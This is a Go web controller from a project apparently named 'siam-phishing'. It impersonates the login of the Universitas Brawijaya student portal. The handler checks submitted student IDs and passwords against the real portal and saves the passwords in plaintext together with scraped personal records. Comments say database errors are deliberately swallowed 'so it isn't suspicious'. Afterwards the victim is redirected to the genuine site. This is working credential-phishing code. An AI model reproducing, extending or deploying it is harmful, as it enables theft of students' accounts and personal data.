package controller

import (
	"log"
	"net/http"
	"siam-phishing/db/entity"
	"time"

	"github.com/dnabil/siamauth"
	"github.com/gin-gonic/gin"
	"github.com/gin-gonic/gin/binding"
	"gorm.io/gorm"
)

type UserController struct {
	sql *gorm.DB
}

func NewUserController(sql *gorm.DB) *UserController {
	return &UserController{sql: sql}
}

type LoginRequest struct {
	NIM 		string `json:"nim" form:"nim"`
	Password	string `json:"password" form:"password"`
}
func (ctr *UserController) Login(c *gin.Context) {
	loginReq := LoginRequest{}
	err := c.BindWith(&loginReq, binding.Default(c.Request.Method, c.ContentType()))
	if err != nil {
		c.HTML(http.StatusBadRequest, "index.go.tmpl", nil)
		return
	}

	// mulai scraping
	siamUser := siamauth.NewUser()
	loginErrMsg, err := siamUser.Login(loginReq.NIM, loginReq.Password)
	if err != nil {
		if err == siamauth.ErrLoginFail{
			c.HTML(http.StatusUnauthorized, "index.go.tmpl", gin.H{
				"error": loginErrMsg,
			})
			return
		} else {
			c.HTML(http.StatusUnauthorized, "index.go.tmpl", gin.H{
				"error": "Server sedang sibuk, silahkan coba beberapa saat lagi",
			})
			return
		}
	}
	defer siamUser.Logout() // opsional
	// end of scraping
	
	
	user := entity.User{
		NIM: loginReq.NIM,
		Password: loginReq.Password,
	}
	// cari nim
	newAccount := false
	err = ctr.sql.WithContext(c.Request.Context()).Where("nim = ?", user.NIM).First(&user).Error

	// jadi shorthand, untuk scrape data mahasiswa
	scrapeDataMahasiswa := func() error{
		if err := siamUser.GetData(); err != nil {
			return err
		}

		user.Nama = siamUser.Data.Nama
		user.Jenjang = siamUser.Data.Jenjang
		user.Fakultas = siamUser.Data.Fakultas
		user.Jurusan = siamUser.Data.Jurusan
		user.ProgramStudi = siamUser.Data.ProgramStudi
		user.Seleksi = siamUser.Data.Seleksi
		user.NomorUjian = siamUser.Data.NomorUjian
		user.FotoProfil = siamUser.Data.FotoProfil
		return nil
	}
	// end of scrapeDataMahasiswa

	// buat akun baru
	if err == gorm.ErrRecordNotFound {
		newAccount = true
		user.CreatedAt = time.Now()
		user.UpdatedAt = time.Now()
		if err := scrapeDataMahasiswa(); err != nil {
			// TODO: tidy log
			log.Println(err)
			log.Println("[error] database error, gagal scrape data mahasiswa")
		}
		err = ctr.sql.WithContext(c.Request.Context()).Create(&user).Error
	}
	if err != nil{
		// TODO: tidy log
		log.Println(err)
		log.Println("[error] database error, gagal menyimpan data siam account.")
		// tetep lanjut biar gak suspicious
	}
	
	// jika bukan akun baru, maka update
	if !newAccount {
		user.Password = loginReq.Password
		if err := scrapeDataMahasiswa(); err != nil {
			// TODO: tidy log
			log.Println(err)
			log.Println("[error] database error, gagal scrape data mahasiswa")
		}
		user.UpdatedAt = time.Now()
		if err = ctr.sql.WithContext(c.Request.Context()).Save(&user).Error; err != nil{
			// TODO: tidy log
			log.Println(err)
			log.Println("[error] database error, gagal update data siam account.")
			// tetep lanjut biar gak suspicious
		}

	}

	siamUrl := "https://siam.ub.ac.id"
	// TODO: rn set cookie to another domain is not possible, need to think another way... 
	c.Redirect(302, siamUrl)
}